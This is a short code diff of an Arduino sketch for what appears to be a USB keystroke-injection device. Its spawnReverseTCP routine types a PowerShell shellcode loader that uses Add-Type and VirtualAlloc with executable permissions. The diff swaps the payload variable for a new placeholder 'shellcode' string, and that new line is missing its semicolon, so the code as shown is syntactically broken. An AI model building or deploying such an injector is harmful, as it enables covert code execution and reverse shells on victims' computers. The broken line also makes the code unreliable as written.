@@ -2,6 +2,8 @@
 // Set built-in LED pin number.
 int ledPin = 13;
 
+// Custom Shellcode
+String shellcode = "Place shellcode here."
 void setup()
 {
     pinMode(ledPin, OUTPUT);
@@ -150,7 +152,7 @@ void spawnReverseTCP()
     Keyboard.print(";$w = Add-Type -memberDefinition $c -Name \\\"Win3");
     Keyboard.print("2\\\" -namespace Win32Functions -passthru;[Byte[]]");
     Keyboard.print(";[Byte[]]$sc = ");
-    Keyboard.print(bytecode);
+    Keyboard.print(shellcode);
     Keyboard.print(";$size = 0x1000;if ($sc.Length -gt 0");
     Keyboard.print("x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0");
     Keyboard.print("x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);");
